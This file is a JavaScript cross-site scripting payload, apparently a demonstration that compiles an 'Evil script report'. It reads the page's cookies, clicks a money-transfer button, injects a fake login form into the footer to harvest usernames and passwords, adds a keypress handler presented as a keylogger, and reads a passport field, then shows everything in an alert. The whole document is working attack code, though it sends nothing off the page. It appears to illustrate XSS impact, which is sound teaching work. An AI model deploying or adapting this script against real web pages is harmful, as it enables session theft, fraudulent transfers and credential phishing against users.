let stolenCookies = '1. Stole cookies - ' + document.cookie + '\n';

let unauthorizedActivities = '2. Performed unauthorized activities (transferred all the money) \n';
document.getElementById("transfer-money").click();

let phishing = '3. Injected phishing form to steal user credentials \n';
document.getElementById('footer').innerHTML = "<h3>Please login to proceed</h3> <form>Username:<br><input type=\"username\" name=\"username\"></br>Password:<br><input type=\"password\" name=\"password\"></br><br><input type=\"submit\" value=\"Logon\"></br>";

let keylogger = '4. Injected keylogger to captue key strokes \n';
document.onkeypress = function(event) {
    alert('Keylogger logged key - ' + event.key);
};

let sensitiveInfo = '5. Stole sensitive information. Passport = ' + document.getElementById('passport').innerHTML + '\n';

let report = 'Evil script report: \n' +
    stolenCookies +
    unauthorizedActivities +
    phishing +
    keylogger +
    sensitiveInfo;

alert(report);
